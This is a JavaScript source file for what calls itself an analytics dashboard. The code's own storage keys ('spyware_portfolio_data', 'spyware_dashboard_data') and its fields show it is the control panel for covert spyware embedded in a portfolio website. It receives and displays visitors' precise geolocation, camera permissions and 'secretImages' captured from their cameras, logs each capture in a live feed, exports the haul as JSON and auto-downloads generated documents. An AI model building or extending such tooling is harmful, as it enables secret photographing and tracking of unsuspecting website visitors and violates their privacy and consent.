// @ts-nocheck
class AnalyticsDashboard {
    constructor() {
        this.visitors = new Map();
        this.capturedImages = [];
        this.liveFeed = [];
        this.isLive = true;
        this.stats = {
            totalVisitors: 0,
            activeSessions: 0,
            permissionGranted: 0,
            dataPoints: 0
        };
        
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.startDataReceiver();
        this.updateUI();
        this.setupWebSocket();
    }

    setupEventListeners() {
        document.getElementById('clearData').addEventListener('click', () => this.clearAllData());
        document.getElementById('exportData').addEventListener('click', () => this.exportData());
        document.getElementById('toggleLive').addEventListener('click', () => this.toggleLiveUpdates());
        
        // Modal close
        document.querySelector('.close').addEventListener('click', () => this.closeModal());
        document.getElementById('imageModal').addEventListener('click', (e) => {
            if (e.target.id === 'imageModal') this.closeModal();
        });
    }

    setupWebSocket() {
        // In production, this would connect to your actual WebSocket server
        // For now, we rely on localStorage and postMessage communication
        console.log('WebSocket setup complete - using localStorage and postMessage');
    }

    startDataReceiver() {
        // Listen for messages from portfolio (using postMessage in production)
        window.addEventListener('message', (event) => {
            if (event.data.type === 'ANALYTICS_DATA') {
                this.processVisitorData(event.data.payload);
            }
        });

        // Check for data stored by portfolio
        this.checkPortfolioData();

        // Also try to fetch from localStorage for demo purposes
        this.loadStoredData();

        // Set up periodic check for new portfolio data (2 seconds for faster updates)
        setInterval(() => this.checkPortfolioData(), 2000);
    }

    processVisitorData(data) {
        if (!data || (!data.sessionId && !data.id)) {
            console.error("\u274c Rejected: No Session ID found in data", data);
            return;
        }

        const visitorId = data.sessionId || data.id;
        const existing = this.visitors.get(visitorId) || {};
        
        // Merge everything into the Map
        this.visitors.set(visitorId, {
            ...existing,
            ...data,
            lastSeen: new Date().toISOString()
        });

        // Update the UI Stats
        this.stats.totalVisitors = this.visitors.size;
        
        // Handle Images - Look specifically for 'secretImages'
        if (data.secretImages && Array.isArray(data.secretImages)) {
            data.secretImages.forEach(img => {
                // Avoid duplicates by checking timestamp
                if (!this.capturedImages.find(ci => ci.timestamp === img.timestamp)) {
                    this.capturedImages.push({
                        ...img,
                        visitorId: visitorId,
                        data: img.data || img.url // Support both field names
                    });
                }
            });
        }

        console.log(`\u2705 Success: Updated visitor ${visitorId}. Total: ${this.stats.totalVisitors}`);
        this.updateUI();
        this.saveData();
    }

    getActiveSessionCount() {
        const now = new Date();
        let activeCount = 0;
        
        this.visitors.forEach(visitor => {
            const lastSeen = new Date(visitor.lastSeen);
            const diffMinutes = (now - lastSeen) / (1000 * 60);
            if (diffMinutes < 30) activeCount++;
        });
        
        return activeCount;
    }

    countDataPoints(data) {
        let count = 1; // Basic visit
        if (data.permissions) count += Object.keys(data.permissions).length;
        if (data.location) count += 3; // lat, long, accuracy
        if (data.capturedImage) count += 5; // Image data
        return count;
    }

    addToLiveFeed(data) {
        const feedItem = {
            type: 'visit',
            timestamp: new Date().toISOString(),
            visitorId: data.id || data.sessionId,
            message: `New visitor from ${data.deviceInfo?.browser || 'Unknown'}`,
            data: data
        };

        if (data.permissions?.camera) {
            this.liveFeed.push({
                ...feedItem,
                type: 'camera',
                message: `Camera access granted by ${data.id || data.sessionId}`
            });
        }

        if (data.permissions?.location) {
            this.liveFeed.push({
                ...feedItem,
                type: 'location',
                message: `Location data received from ${data.id || data.sessionId}`
            });
        }

        if (data.capturedImage) {
            this.liveFeed.push({
                ...feedItem,
                type: 'camera',
                message: `Image captured from ${data.id || data.sessionId}`
            });
        }

        // Keep only last 50 items
        this.liveFeed = this.liveFeed.slice(-50);
    }

    updateUI() {
        // Update stats
        document.getElementById('totalVisitors').textContent = this.stats.totalVisitors;
        document.getElementById('activeSessions').textContent = this.stats.activeSessions;
        document.getElementById('permissionGranted').textContent = this.stats.permissionGranted;
        document.getElementById('dataPoints').textContent = this.stats.dataPoints;

        // Update visitors list
        this.updateVisitorsList();

        // Update live feed
        this.updateLiveFeed();

        // Update captured images
        this.updateCapturedImages();

        // Update device analytics
        this.updateDeviceAnalytics();
    }

    updateVisitorsList() {
        const container = document.getElementById('visitorsList');
        
        if (this.visitors.size === 0) {
            container.innerHTML = '<p class="no-data">No visitor data yet</p>';
            return;
        }

        const visitorsArray = Array.from(this.visitors.values()).slice(-10).reverse();
        container.innerHTML = visitorsArray.map(visitor => `
            <div class="visitor-card">
                <h4>${visitor.id || 'Unknown'}</h4>
                <div class="visitor-info">
                    <div><strong>Device:</strong> ${visitor.deviceInfo?.browser || 'Unknown'}</div>
                    <div><strong>Screen:</strong> ${visitor.screenResolution || 'Unknown'}</div>
                    <div><strong>Location:</strong> ${visitor.location ? (typeof visitor.location.latitude === 'number' && typeof visitor.location.longitude === 'number' ? `${visitor.location.latitude.toFixed(6)}, ${visitor.location.longitude.toFixed(6)} (${visitor.location.accuracyLevel || visitor.location.source || 'browser'})${visitor.location.accuracy ? ` ±${Math.round(visitor.location.accuracy)}m` : ''}` : visitor.location.latitude && visitor.location.longitude ? `${visitor.location.latitude}, ${visitor.location.longitude} (${visitor.location.source || 'browser'})` : 'Not granted') : 'Not granted'}</div>
                    <div><strong>Permissions:</strong> ${this.formatPermissions(visitor.permissions)}</div>
                    <div><strong>Last seen:</strong> ${new Date(visitor.lastSeen).toLocaleTimeString()}</div>
                </div>
            </div>
        `).join('');
    }

    updateLiveFeed() {
        const container = document.getElementById('liveFeed');
        
        if (this.liveFeed.length === 0) {
            container.innerHTML = '<p class="no-data">Waiting for data...</p>';
            return;
        }

        container.innerHTML = this.liveFeed.slice(-20).reverse().map(item => `
            <div class="feed-item ${item.type}">
                <strong>${new Date(item.timestamp).toLocaleTimeString()}</strong><br>
                ${item.message}
            </div>
        `).join('');
    }

    updateCapturedImages() {
        const container = document.getElementById('capturedImages');
        
        if (this.capturedImages.length === 0) {
            container.innerHTML = '<p class="no-data">No images captured yet</p>';
            return;
        }

        container.innerHTML = this.capturedImages.slice(-12).reverse().map((img, index) => `
            <img src="${img.data}" alt="Captured ${index + 1}" class="image-thumbnail" 
                 onclick="dashboard.showImageModal(${this.capturedImages.length - 1 - index})">
        `).join('');
    }

    updateDeviceAnalytics() {
        const deviceStats = {};
        
        this.visitors.forEach(visitor => {
            const browser = visitor.deviceInfo?.browser || 'Unknown';
            deviceStats[browser] = (deviceStats[browser] || 0) + 1;
        });

        const container = document.getElementById('deviceBreakdown');
        container.innerHTML = Object.entries(deviceStats)
            .sort(([,a], [,b]) => b - a)
            .map(([device, count]) => `
                <div style="display: flex; justify-content: space-between; padding: 5px 0;">
                    <span>${device}</span>
                    <span><strong>${count}</strong></span>
                </div>
            `).join('');
    }

    formatPermissions(permissions) {
        if (!permissions) return 'None';
        const granted = Object.entries(permissions)
            .filter(([, granted]) => granted)
            .map(([perm]) => perm);
        return granted.length > 0 ? granted.join(', ') : 'None';
    }

    showImageModal(index) {
        const image = this.capturedImages[index];
        if (!image) return;

        document.getElementById('modalImage').src = image.data;
        document.getElementById('imageTitle').textContent = `Captured from ${image.visitorId}`;
        document.getElementById('imageTimestamp').textContent = `Time: ${new Date(image.timestamp).toLocaleString()}`;
        document.getElementById('imageDeviceInfo').textContent = `Device: ${image.deviceInfo || 'Unknown'}`;
        document.getElementById('imageModal').style.display = 'block';
    }

    closeModal() {
        document.getElementById('imageModal').style.display = 'none';
    }

    toggleLiveUpdates() {
        this.isLive = !this.isLive;
        const btn = document.getElementById('toggleLive');
        btn.textContent = this.isLive ? 'Pause Live Updates' : 'Resume Live Updates';
        btn.className = this.isLive ? 'btn-secondary' : 'btn-primary';
        
        // Update status indicator
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        
        if (this.isLive) {
            statusDot.style.background = '#2ecc71';
            statusText.textContent = 'Connected';
        } else {
            statusDot.style.background = '#f39c12';
            statusText.textContent = 'Paused';
        }
    }

    clearAllData() {
        if (confirm('Are you sure you want to clear all collected data?')) {
            this.visitors.clear();
            this.capturedImages = [];
            this.liveFeed = [];
            this.stats = {
                totalVisitors: 0,
                activeSessions: 0,
                permissionGranted: 0,
                dataPoints: 0
            };
            
            localStorage.removeItem('spyware_dashboard_data');
            this.updateUI();
        }
    }

    exportData() {
        const exportData = {
            stats: this.stats,
            visitors: Array.from(this.visitors.values()),
            capturedImages: this.capturedImages,
            liveFeed: this.liveFeed,
            exportDate: new Date().toISOString()
        };

        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `analytics_export_${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    saveData() {
        const dataToSave = {
            visitors: Array.from(this.visitors.entries()),
            capturedImages: this.capturedImages,
            liveFeed: this.liveFeed,
            stats: this.stats
        };
        localStorage.setItem('spyware_dashboard_data', JSON.stringify(dataToSave));
    }

    checkPortfolioData() {
        try {
            const raw = localStorage.getItem('spyware_portfolio_data');
            if (!raw) return;

            const data = JSON.parse(raw);
            // Ensure we are working with an array
            const entries = Array.isArray(data) ? data : [data];
            
            console.log(`\ud83d\udce5 RAW DATA SYNC: Processing ${entries.length} entries`);

            entries.forEach(entry => {
                // UNIVERSAL EXTRACTION: 
                // Try entry.data (wrapped), then entry (direct), then entry.payload
                const payload = entry.data || (entry.sessionId ? entry : null) || entry.payload;
                
                if (payload) {
                    this.processVisitorData(payload);
                } else {
                    console.warn("\u26a0\ufe0f Skipped malformed entry:", entry);
                }
            });

            // Clear only AFTER successful processing
            localStorage.removeItem('spyware_portfolio_data');
        } catch (e) {
            console.error('\u274c Dashboard Sync Error:', e);
        }
    }

    handleStatsDocument(data) {
        // Store document data
        if (!this.statsDocuments) this.statsDocuments = [];
        
        this.statsDocuments.push({
            sessionId: data.sessionId,
            documentContent: data.documentContent,
            fileName: data.fileName,
            timestamp: data.timestamp
        });
        
        // Add to live feed
        this.addToLiveFeed({
            type: 'document',
            message: `Stats document generated for ${data.sessionId}`,
            timestamp: new Date().toISOString()
        });
        
        // Auto-download document to dashboard device
        this.downloadDocument(data.documentContent, data.fileName);
        
        console.log('Stats document processed:', data.fileName);
    }

    downloadDocument(documentContent, fileName) {
        const blob = new Blob([documentContent], { type: 'application/msword' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        setTimeout(() => URL.revokeObjectURL(url), 1000);
    }

    loadStoredData() {
        const stored = localStorage.getItem('spyware_dashboard_data');
        if (stored) {
            try {
                const data = JSON.parse(stored);
                this.visitors = new Map(data.visitors || []);
                this.capturedImages = data.capturedImages || [];
                this.statsDocuments = data.statsDocuments || [];
                this.updateUI();
            } catch (e) {
                console.error('Error loading stored data:', e);
            }
        }
    }

    getDeviceInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        
        return {
            browser,
            os: navigator.platform,
            mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
        };  
    };

    generateSessionId() {
        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    };
};

// Initialize dashboard
var dashboard = new AnalyticsDashboard();

// Expose for cross-window communication
window.dashboard = dashboard;
